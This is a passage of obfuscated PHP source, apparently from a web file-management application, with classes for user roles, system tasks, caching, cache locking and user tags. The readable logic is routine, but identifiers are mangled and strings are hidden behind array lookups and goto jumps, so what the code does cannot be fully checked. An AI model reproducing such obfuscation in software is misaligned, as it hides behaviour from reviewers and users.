($²ÛĞÍ[$ÍÎ‡ª¤Í[2200]] == 1) { $½á¢şû›[$õÍ™úİš][$ÍÎ‡ª¤Í[529]] = LNG($ÍÎ‡ª¤Í[2476]); } } } return $½á¢şû›; } public function update($Ú€ù˜ÓÊ, $›É¸’‘§) { $À Ãí‡Ü =& $_SERVER[¼¥ÊĞÙÌ]; $‘èáËü = parent::listData($Ú€ù˜ÓÊ); $Ÿ€ƒ„ÈÎ = $this->findByName($›É¸’‘§[$À Ãí‡Ü[32]]); if (!$‘èáËü || $Ÿ€ƒ„ÈÎ && $Ÿ€ƒ„ÈÎ[$À Ãí‡Ü[478]] != $‘èáËü[$À Ãí‡Ü[478]]) { return !1; } if ($Ÿ€ƒ„ÈÎ[$À Ãí‡Ü[2200]] == 1) { $›É¸’‘§ = array($À Ãí‡Ü[32] => $›É¸’‘§[$À Ãí‡Ü[32]], $À Ãí‡Ü[2014] => $›É¸’‘§[$À Ãí‡Ü[2014]]); } $this->filterAuth($›É¸’‘§[$À Ãí‡Ü[490]]); return parent::update($Ú€ù˜ÓÊ, $›É¸’‘§); } public function remove($²‰ĞºÒì) { $ƒ¦À‡›Ú = parent::listData($²‰ĞºÒì); if (!$ƒ¦À‡›Ú || $ƒ¦À‡›Ú[$_SERVER[¼¥ÊĞÙÌ][192]]) { return !1; } return parent::remove($²‰ĞºÒì); } public function add($¢¬÷Õƒª) { $Â¡åò› =& $_SERVER[¼¥ÊĞÙÌ]; $¼ôå·½ = $¢¬÷Õƒª[$Â¡åò›[32]]; if ($this->findByName($¼ôå·½)) { return !1; } $™êÏş = array($Â¡åò›[497] => $¼ôå·½, $Â¡åò›[1997] => $Â¡åò›[12], $Â¡åò›[1993] => $Â¡åò›[2001], $Â¡åò›[2477] => 1, $Â¡åò›[1996] => 0, $Â¡åò›[2478] => 0, $Â¡åò›[1995] => $this->getSort()); $¢¬÷Õƒª = array_merge($™êÏş, $¢¬÷Õƒª); $this->filterAuth($¢¬÷Õƒª[$Â¡åò›[490]]); return parent::insert($¢¬÷Õƒª); } private function getSort() { $Ä£ıÅé© =& $_SERVER[¼¥ÊĞÙÌ]; $¬ ƒÆŞé = parent::listData(); $³ÌÓÌ› = array_to_keyvalue($¬ ƒÆŞé, $Ä£ıÅé©[12], $Ä£ıÅé©[2015]); return empty($³ÌÓÌ›) ? 0 : max($³ÌÓÌ›) + 1; } private function filterAuth(&$´í¹™ôÒ) { $ÃŞñ®…ş =& $_SERVER[¼¥ÊĞÙÌ]; $Íò±¯ÍÍ = array(); $¿ˆ¿ÊØŠ = array_filter(explode($ÃŞñ®…ş[50], $´í¹™ôÒ)); foreach ($¿ˆ¿ÊØŠ as $´í¹™ôÒ) { $ŠöÔÚ…ò = explode($ÃŞñ®…ş[10], $´í¹™ôÒ); if ($ŠöÔÚ…ò[0] == $ÃŞñ®…ş[2479] && $ŠöÔÚ…ò[1] != $ÃŞñ®…ş[1287]) { $õ×ËÀøÉ = $ŠöÔÚ…ò[0] . $ÃŞñ®…ş[10] . $ŠöÔÚ…ò[1] . $ÃŞñ®…ş[2480]; if (!in_array($õ×ËÀøÉ, $¿ˆ¿ÊØŠ)) { $Íò±¯ÍÍ[] = $õ×ËÀøÉ; } } $Íò±¯ÍÍ[] = $´í¹™ôÒ; } $´í¹™ôÒ = implode($ÃŞñ®…ş[50], $Íò±¯ÍÍ); } public function findRoleDefault() { $Øà®çÉ× =& $_SERVER[¼¥ÊĞÙÌ]; $àÀ­—ÇĞ = parent::listData(); $åŸº… = !1; foreach ($àÀ­—ÇĞ as $«ÊíÆèİ) { if (!$«ÊíÆèİ || $«ÊíÆèİ[$Øà®çÉ×[2013]] == $Øà®çÉ×[231] || $«ÊíÆèİ[$Øà®çÉ×[2200]] == 1) { continue; } if (strstr($«ÊíÆèİ[$Øà®çÉ×[490]], $Øà®çÉ×[2481])) { continue; } if (!strstr($«ÊíÆèİ[$Øà®çÉ×[490]], $Øà®çÉ×[2482])) { continue; } if (!$åŸº…) { $åŸº… = $«ÊíÆèİ; continue; } $‹şì•üİ = explode($Øà®çÉ×[50], $åŸº…[$Øà®çÉ×[490]]); $°¨ñİ» = explode($Øà®çÉ×[50], $«ÊíÆèİ[$Øà®çÉ×[490]]); if (count($‹şì•üİ) > count($°¨ñİ»)) { $åŸº… = $«ÊíÆèİ; } } return $åŸº… ? $åŸº…[$Øà®çÉ×[478]] : $Øà®çÉ×[12]; } public function sort($Ïı¬³¯, $·„óÀÙ×) { return parent::update($Ïı¬³¯, $·„óÀÙ×); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\164\x61\x73\x6b\x4c\x69\163\164"; public $field = array("\156\141\155\x65", "\164\x79\x70\x65", "\145\x76\145\x6e\x74", "\x74\x69\x6d\x65", "\x64\x65\163\143", "\x73\171\x73\164\145\x6d", "\145\x6e\x61\x62\x6c\x65", "\154\x61\163\x74\x52\165\156", "\163\157\x72\x74"); public function listData($œÔãÊğÂ = false, $ÖùĞ¥’¬ = "\x73\x6f\x72\164", $ûŞ‰“â‘ = false) { return parent::listData($œÔãÊğÂ, $ÖùĞ¥’¬, $ûŞ‰“â‘); } public function add($ıÚ¡ÚÍİ) { $Ğšü‡ßê =& $_SERVER[¼¥ÊĞÙÌ]; $Áòî™‚ = $this->findByName($ıÚ¡ÚÍİ[$Ğšü‡ßê[32]]); if ($Áòî™‚) { return !1; } $ıÚ¡ÚÍİ[$Ğšü‡ßê[1740]] = 0; $ıÚ¡ÚÍİ[$Ğšü‡ßê[2015]] = $this->getSort(); return parent::insert($ıÚ¡ÚÍİ); } private function getSort() { $ÚàŞçñ¢ =& $_SERVER[¼¥ÊĞÙÌ]; $†ö±¥ëÊ = parent::listData(); $ÜØô“‚ = array_to_keyvalue($†ö±¥ëÊ, $ÚàŞçñ¢[12], $ÚàŞçñ¢[2015]); return empty($ÜØô“‚) ? 0 : max($ÜØô“‚) + 1; } public function update($æ„³Èú, $×¹ÜçÀØ) { $’¨äÈ í =& $_SERVER[¼¥ÊĞÙÌ]; $âÚœ€Ù¡ = $this->listData($æ„³Èú); $¬ˆ…îÎ = $this->findByName($×¹ÜçÀØ[$’¨äÈ í[32]]); if (!$âÚœ€Ù¡ || $¬ˆ…îÎ && $¬ˆ…îÎ[$’¨äÈ í[478]] != $âÚœ€Ù¡[$’¨äÈ í[478]]) { return !1; } return parent::update($æ„³Èú, $×¹ÜçÀØ); } public function remove($Æ×ÕÃıı, $ŠŸ…ùä = false) { $ê¤Áˆ©ò =& $_SERVER[¼¥ÊĞÙÌ]; $½Ì¢é— = $this->listData($Æ×ÕÃıı); if (!$½Ì¢é—) { return; } if (!$ŠŸ…ùä && $½Ì¢é—[$ê¤Áˆ©ò[192]] == $ê¤Áˆ©ò[91]) { return !1; } return parent::remove($Æ×ÕÃıı); } public function enable($è˜·èè, $½³Ä¿¬İ) { return $this->update($è˜·èè, array($_SERVER[¼¥ÊĞÙÌ][2471] => $½³Ä¿¬İ)); } public function run($˜­£Ñ) { return $this->update($˜­£Ñ, array($_SERVER[¼¥ÊĞÙÌ][2483] => time())); } } goto c©ÚĞ¢Ê‘Û; bÜ¡“£‡ª‚: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ÄğÏ”À– =& $_SERVER[¼¥ÊĞÙÌ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $óšÎõ¶Ğ = $GLOBALS[$ÄğÏ”À–[6]][$ÄğÏ”À–[427]]; $ƒ»ÁŞÁ® = $óšÎõ¶Ğ[$óšÎõ¶Ğ[$ÄğÏ”À–[906]]]; $½ÕŒ·– = $óšÎõ¶Ğ[$ÄğÏ”À–[907]]; switch ($óšÎõ¶Ğ[$ÄğÏ”À–[906]]) { case $ÄğÏ”À–[21]: self::$handle = Model($ÄğÏ”À–[908]); break; case $ÄğÏ”À–[909]: self::$handle = new CacheRedis($ƒ»ÁŞÁ®, $½ÕŒ·–); break; case $ÄğÏ”À–[910]: self::$handle = new CacheMemcached($ƒ»ÁŞÁ®, $½ÕŒ·–); break; case $ÄğÏ”À–[233]: self::$handle = new CacheFile($ƒ»ÁŞÁ®, $½ÕŒ·–); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($³ßÙŒµ) { if (is_array($³ßÙŒµ) || is_object($³ßÙŒµ)) { $³ßÙŒµ = json_encode($³ßÙŒµ); } $³ßÙŒµ = rawurlencode($³ßÙŒµ); return md5(KOD_SITE_ID . $_SERVER[¼¥ÊĞÙÌ][11] . $³ßÙŒµ); } public static function get($†™ú¢”°, $ÉÀçˆÅ° = false) { $§ß²³öš = self::key($†™ú¢”°); $õ¿¤ó  = self::init(); if ($ÉÀçˆÅ°) { return unserialize($õ¿¤ó ->get($§ß²³öš)); } if (!isset(self::$memoryCache[$§ß²³öš])) { $õ×¹ş™ = $õ¿¤ó ->get($§ß²³öš); self::$memoryCache[$§ß²³öš] = unserialize($õ×¹ş™); } return self::$memoryCache[$§ß²³öš]; } public static function set($Ã­ÈŸÑù, $Ìé‡½Ô’, $ü›³×ûÈ = false) { $¦…×¡ãŒ =& $_SERVER[¼¥ÊĞÙÌ]; $Íùì¥Ø = self::key($Ã­ÈŸÑù); if (isset(self::$memoryCache[$Íùì¥Ø]) && self::$memoryCache[$Íùì¥Ø] === $Ìé‡½Ô’) { return !0; } if ($ü›³×ûÈ === 0) { self::$memoryCache[$Íùì¥Ø] = $Ìé‡½Ô’; return !0; } $¾ù£³›ª = self::init(); $ÈÈ’¢×œ = serialize($Ìé‡½Ô’); CacheLock::lock($Ã­ÈŸÑù . $¦…×¡ãŒ[911]); $£‰¦Í±ò = $¾ù£³›ª->set($Íùì¥Ø, $ÈÈ’¢×œ, $ü›³×ûÈ); self::$memoryCache[$Íùì¥Ø] = $Ìé‡½Ô’; CacheLock::unlock($Ã­ÈŸÑù . $¦…×¡ãŒ[911]); return $£‰¦Í±ò; } public static function getCall($Í¦ãæˆ”, $˜ĞËğçş, $áÁ¿«Áü, $ãĞÈ›…Ù = array()) { $±­ÊÉÕ =& $_SERVER[¼¥ÊĞÙÌ]; $Ûø›–¡¸ = self::get($Í¦ãæˆ”); if ($Ûø›–¡¸ || $Ûø›–¡¸ === $±­ÊÉÕ[12]) { return $Ûø›–¡¸; } $Ûø›–¡¸ = call_user_func_array($áÁ¿«Áü, $ãĞÈ›…Ù); $Ûø›–¡¸ = $Ûø›–¡¸ ? $Ûø›–¡¸ : $±­ÊÉÕ[12]; self::set($Í¦ãæˆ”, $Ûø›–¡¸, $˜ĞËğçş); return $Ûø›–¡¸; } public static function remove($Í¢Î¦™) { $†Òı°Å• = self::key($Í¢Î¦™); unset(self::$memoryCache[$†Òı°Å•]); self::clearTimeout(); CacheLock::lock($Í¢Î¦™); $ãÍ¨Âª = self::init()->remove($†Òı°Å•); CacheLock::unlock($Í¢Î¦™); return $ãÍ¨Âª; } public static function removeMemory($²‘÷ÅŞ©) { $—õ°‹ = self::key($²‘÷ÅŞ©); unset(self::$memoryCache[$—õ°‹]); } public static function clearMemory($ÛÕ£ÔÚé = false) { if ($ÛÕ£ÔÚé) { $ÛÕ£ÔÚé = self::key($ÛÕ£ÔÚé); unset(self::$memoryCache[$ÛÕ£ÔÚé]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¼¥ÊĞÙÌ][912])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¼¥ÊĞÙÌ][913])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Œ´Ã«ŠÄ, $Í í¡ÙÊ) { $î½õÏ =& $_SERVER[¼¥ÊĞÙÌ]; $this->cachePath = $Œ´Ã«ŠÄ[$î½õÏ[87]]; $this->prefix = $î½õÏ[914]; $this->cacheTime = $Í í¡ÙÊ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ô°ÉåàÏ) { $ã¸˜½Í™ =& $_SERVER[¼¥ÊĞÙÌ]; $ô°ÉåàÏ = str_replace(array($ã¸˜½Í™[915], $ã¸˜½Í™[100], $ã¸˜½Í™[76]), $ã¸˜½Í™[916], $ô°ÉåàÏ); return $this->cachePath . $ã¸˜½Í™[917] . $ô°ÉåàÏ . $ã¸˜½Í™[918]; } public function set($½äâœ²á, $ƒúÛÛ×„, $å¾ÌÆõö = false) { $å¾ÌÆõö = $å¾ÌÆõö ? $å¾ÌÆõö : $this->cacheTime; $„„ñ¨Ñ = $this->getFile($½äâœ²á); if (file_put_contents($„„ñ¨Ñ, $this->prefix . $ƒúÛÛ×„, LOCK_EX)) { @touch($„„ñ¨Ñ, intval(time() + $å¾ÌÆõö)); clearstatcache(); return !0; } @unlink($„„ñ¨Ñ); return !1; } public function get($«¨šæº©) { $íòå—¹’ = $this->getFile($«¨šæº©); if (file_exists($íòå—¹’) && filemtime($íòå—¹’) < time()) { @unlink($íòå—¹’); return !1; } $¸’š«µ¹ = @file_get_contents($íòå—¹’); return substr($¸’š«µ¹, strlen($this->prefix)); } public function remove($¡õ•æ˜) { $Î§ï™ = $this->getFile($¡õ•æ˜); return @unlink($Î§ï™); } public function deleteAll() { $ôï¡Ëµé =& $_SERVER[¼¥ÊĞÙÌ]; $­É‘–£Ş = scandir($this->cachePath); foreach ($­É‘–£Ş as $¤²“¬ÙÒ) { $³ÉÂ¤Ç¡ = $this->cachePath . $¤²“¬ÙÒ; if (strpos($³ÉÂ¤Ç¡, $ôï¡Ëµé[918]) && strpos($³ÉÂ¤Ç¡, $ôï¡Ëµé[919])) { @unlink($³ÉÂ¤Ç¡); } } } public function clearTimeout() { $½ÓöÌÔ£ =& $_SERVER[¼¥ÊĞÙÌ]; $êå§«˜€ = scandir($this->cachePath); foreach ($êå§«˜€ as $óá×Œ€Ş) { $¨¹Çâ‚ = $this->cachePath . $óá×Œ€Ş; if (strpos($¨¹Çâ‚, $½ÓöÌÔ£[918]) && strpos($¨¹Çâ‚, $½ÓöÌÔ£[919]) && filemtime($¨¹Çâ‚) < time()) { @unlink($¨¹Çâ‚); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ãš¾€öÃ =& $_SERVER[¼¥ÊĞÙÌ]; if (self::$handle) { return self::$handle; } $ŠéÓÉû = $GLOBALS[$ãš¾€öÃ[6]][$ãš¾€öÃ[427]]; self::$timeout = $ŠéÓÉû[$ãš¾€öÃ[920]] ? $ŠéÓÉû[$ãš¾€öÃ[920]] : 10; $ÛÏ›„¥é = _get($GLOBALS[$ãš¾€öÃ[6]], $ãš¾€öÃ[921]); $­À…ÅÒ = $ŠéÓÉû[$ãš¾€öÃ[906]] ? $ŠéÓÉû[$ãš¾€öÃ[906]] : $ãš¾€öÃ[233]; if ($­À…ÅÒ == $ãš¾€öÃ[21] && $ÛÏ›„¥é == $ãš¾€öÃ[13]) { $­À…ÅÒ = $ãš¾€öÃ[233]; } switch ($­À…ÅÒ) { case $ãš¾€öÃ[909]: self::$handle = new CacheLockRedis(); break; case $ãš¾€öÃ[910]: self::$handle = new CacheLockMemcached(); break; case $ãš¾€öÃ[21]: self::$handle = new CacheLockDatabase(); break; case $ãš¾€öÃ[233]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ãš¾€öÃ[922], $ãš¾€öÃ[923]); } return self::$handle; } private static function key($¿¨Ö–ÖÏ) { return $_SERVER[¼¥ÊĞÙÌ][924] . Cache::key($¿¨Ö–ÖÏ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($›’şÂ¬à = '') { self::$errorMsg = $›’şÂ¬à; } public static function lockGlobal($ÃÍß¡Ãò, $‰–ÒıºÜ) { return self::lock($ÃÍß¡Ãò, $‰–ÒıºÜ, !0); } public static function lock($¢³…èÂö, $œúò•º = false, $„¡±¥¢€ = false) { $ö÷›ü„Í =& $_SERVER[¼¥ÊĞÙÌ]; $«ò–õ‚¤ = self::init(); $®ƒÃÙë = self::key($¢³…èÂö); $œúò•º = $œúò•º ? $œúò•º : self::$timeout; $Íî†ëŸè = timeFloat(); if (_get($GLOBALS, $ö÷›ü„Í[925], !1)) { if (!$«ò–õ‚¤->lock($®ƒÃÙë, 0.2)) { die; } return !0; } $ùÆÖ¼ñÑ = $«ò–õ‚¤->lock($®ƒÃÙë, $œúò•º); $§’â‡‡ş = timeFloat(); if (!$ùÆÖ¼ñÑ) { $ÂˆÖ€ç = "\x6c\x6f\143\153\40\x65\x72\x72\x6f\x72\73\153\x65\x79\x3d{$¢³…èÂö}\x3b\164\x69\x6d\x65\x3d{$œúò•º}\73" . self::$errorMsg . $ö÷›ü„Í[74] . get_caller_msg(); $£ùË³¦Ä = LNG($ö÷›ü„Í[926]) . "\50{$œúò•º}\x73\51\x2e" . LNG($ö÷›ü„Í[927]); $£ùË³¦Ä .= $ö÷›ü„Í[928]; if (is_string(self::$errorMsg) && self::$errorMsg) { $£ùË³¦Ä = $£ùË³¦Ä . $ö÷›ü„Í[929] . self::$errorMsg; } write_log($ö÷›ü„Í[930] . sprintf($ö÷›ü„Í[931], timeFloat() - $Íî†ëŸè) . $ö÷›ü„Í[932] . $ÂˆÖ€ç . $ö÷›ü„Í[933] . json_encode(error_get_last()), $ö÷›ü„Í[923]); show_json($£ùË³¦Ä, !1); } if (!$„¡±¥¢€) { self::$lockItem[$®ƒÃÙë] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $®±ë„ûô = number_format(timeFloat() - $§’â‡‡ş, 3); write_log($ö÷›ü„Í[934] . $¢³…èÂö . $ö÷›ü„Í[935] . $®±ë„ûô, $ö÷›ü„Í[923]); } return $ùÆÖ¼ñÑ; } public static function lockGet($¢²Şê™ô) { $ÖÃ„¾Æ = self::key($¢²Şê™ô); if (self::$lockItem[$ÖÃ„¾Æ]) { return self::$lockItem[$ÖÃ„¾Æ]; } return self::init()->lockGet($ÖÃ„¾Æ); } public static function unlock($«‚¹Ìä›) { $Ä¬ƒä¾† =& $_SERVER[¼¥ÊĞÙÌ]; $‰³„ûÃç = self::key($«‚¹Ìä›); self::$lockItem[$‰³„ûÃç] = null; self::init()->unlock($‰³„ûÃç); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ä¬ƒä¾†[936] . $«‚¹Ìä›, $Ä¬ƒä¾†[923]); } return; } public static function unlockRuntime() { $¤±œ‹Íš =& $_SERVER[¼¥ÊĞÙÌ]; $§àÂø³Ú = self::init(); $¼Ö¦õ…Û = !1; foreach (self::$lockItem as $º©°Æé¶ => $’ÏËÍš—) { if (!$’ÏËÍš—) { continue; } $§àÂø³Ú->unlock($º©°Æé¶); if (!$¼Ö¦õ…Û) { $¼Ö¦õ…Û = !0; write_log($¤±œ‹Íš[937] . $º©°Æé¶ . $¤±œ‹Íš[74] . get_caller_msg(), $¤±œ‹Íš[923]); continue; } write_log($¤±œ‹Íš[937] . $º©°Æé¶, $¤±œ‹Íš[923]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $®¼“û¬ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¤±œ‹Íš[938] . $®¼“û¬ . $¤±œ‹Íš[939] . ACTION, $¤±œ‹Íš[923]); } } public static function fileLock($¨€Á¦÷«) { $»ÜÕš˜š =& $_SERVER[¼¥ÊĞÙÌ]; if (!$GLOBALS[$»ÜÕš˜š[940]]) { $GLOBALS[$»ÜÕš˜š[940]] = array(); } $GLOBALS[$»ÜÕš˜š[940]][$¨€Á¦÷«] = !1; $á¼’ŸÅ‰ = fopen(DATA_PATH . $¨€Á¦÷« . $»ÜÕš˜š[941], $»ÜÕš˜š[942]); if (!$á¼’ŸÅ‰) { return !1; } $GLOBALS[$»ÜÕš˜š[940]][$¨€Á¦÷«] = $á¼’ŸÅ‰; if (flock($á¼’ŸÅ‰, LOCK_EX)) { return !0; } self::unlock($¨€Á¦÷«); show_json($»ÜÕš˜š[943], !1); return !1; } public static function fileUnlock($ğ½øöùó) { $ºòıı =& $_SERVER[¼¥ÊĞÙÌ]; $´¡œ„ñ = $GLOBALS[$ºòıı[940]][$ğ½øöùó]; if (!$´¡œ„ñ) { return; } $GLOBALS[$ºòıı[940]][$ğ½øöùó] = !1; flock($´¡œ„ñ, LOCK_UN); fclose($´¡œ„ñ); } public static function fileUnlockAll() { $Öß¡›ª‡ =& $_SERVER[¼¥ÊĞÙÌ]; if (!isset($GLOBALS[$Öß¡›ª‡[940]]) || !$GLOBALS[$Öß¡›ª‡[940]]) { return; } foreach ($GLOBALS[$Öß¡›ª‡[940]] as $åÍ©íÓü => $‚¾Í ¯İ) { if (!$‚¾Í ¯İ) { continue; } $GLOBALS[$Öß¡›ª‡[940]][$åÍ©íÓü] = !1; flock($‚¾Í ¯İ, LOCK_UN); fclose($‚¾Í ¯İ); } $GLOBALS[$Öß¡›ª‡[940]] = array(); } } goto D™Œ¥Êò•å; c¯ì­î½‡Í: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\137\x66\141\x76"; protected function cacheFunctionAlias($ÏÜËëĞü) { $»Ë¨í›œ =& $_SERVER[¼¥ÊĞÙÌ]; return array($»Ë¨í›œ[2107] => array($»Ë¨í›œ[2538] . USER_ID, $»Ë¨í›œ[2108])); } protected function listData() { $×”¢Ÿ­ =& $_SERVER[¼¥ÊĞÙÌ]; $’Ùˆ½Š¿ = array($×”¢Ÿ­[1781] => USER_ID, $×”¢Ÿ­[562] => array($×”¢Ÿ­[2111], 0)); $ ¬Ïö‰ö = $×”¢Ÿ­[2539]; $ºîßÏ² = $this->field($ ¬Ïö‰ö)->where($’Ùˆ½Š¿)->order($×”¢Ÿ­[2113])->select(); return $ºîßÏ² ? $ºîßÏ² : array(); } protected function addToTag($Ğ½Î€í¾, $ÊĞ¾«Õ¹) { $™±¼çÜş =& $_SERVER[¼¥ÊĞÙÌ]; if (!Model($™±¼çÜş[2261])->listData($ÊĞ¾«Õ¹)) { return !1; } if (is_numeric($Ğ½Î€í¾)) { $“Ÿ¦Şû = Model($™±¼çÜş[904])->pathInfo($Ğ½Î€í¾); if (!$“Ÿ¦Şû) { return !1; } } else { $“Ÿ¦Şû = IO::infoSimple($Ğ½Î€í¾); if (!$“Ÿ¦Şû) { return !1; } $²×’×­ = $“Ÿ¦Şû[$™±¼çÜş[32]]; $¿™´ªé = $“Ÿ¦Şû[$™±¼çÜş[33]]; if (isset($“Ÿ¦Şû[$™±¼çÜş[488]])) { $¿™´ªé = $“Ÿ¦Şû[$™±¼çÜş[488]] == $™±¼çÜş[91] ? $™±¼çÜş[78] : $™±¼çÜş[233]; } } $×¦®ã®° = array($™±¼çÜş[1781] => USER_ID, $™±¼çÜş[562] => $ÊĞ¾«Õ¹, $™±¼çÜş[498] => $Ğ½Î€í¾, $™±¼çÜş[499] => $¿™´ªé ? $¿™´ªé : $™±¼çÜş[493], $™±¼çÜş[497] => $²×’×­ ? $²×’×­ : $™±¼çÜş[12], $™±¼çÜş[1995] => 0); if ($this->where($×¦®ã®°)->find()) { return !1; } return $this->add($×¦®ã®°); } protected function removeFromTag($‡¿¨ò–À, $ÙâÜ·ºö) { $ß¾Ùğ =& $_SERVER[¼¥ÊĞÙÌ]; if (!Model($ß¾Ùğ[2261])->listData($ÙâÜ·ºö)) { return !1; } if (is_array($‡¿¨ò–À)) { $‡¿¨ò–À = array($ß¾Ùğ[7], $‡¿¨ò–À); } $—¸íÑı‚ = array($ß¾Ùğ[1781] => USER_ID, $ß¾Ùğ[562] => $ÙâÜ·ºö, $ß¾Ùğ[498] => $‡¿¨ò–À); return $this->where($—¸íÑı‚)->delete(); } protected function removeByTag($œ’ŠÆˆˆ) { $Æ¡‡ËÁÕ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$œ’ŠÆˆˆ) { return !1; } $¾œÔÁÁú = array($Æ¡‡ËÁÕ[1781] => USER_ID, $Æ¡‡ËÁÕ[562] => $œ’ŠÆˆˆ); return $this->where($¾œÔÁÁú)->delete(); } protected function removeBySource($”Ä–©Œ) { $ŸÙ…å÷ =& $_SERVER[¼¥ÊĞÙÌ]; if (is_array($”Ä–©Œ)) { $”Ä–©Œ = array($ŸÙ…å÷[7], $”Ä–©Œ); } $¬Ÿ¹Ò‰ù = array($ŸÙ…å÷[1781] => USER_ID, $ŸÙ…å÷[562] => array($ŸÙ…å÷[1100], 0), $ŸÙ…å÷[498] => $”Ä–©Œ); return $this->where($¬Ÿ¹Ò‰ù)->delete(); } }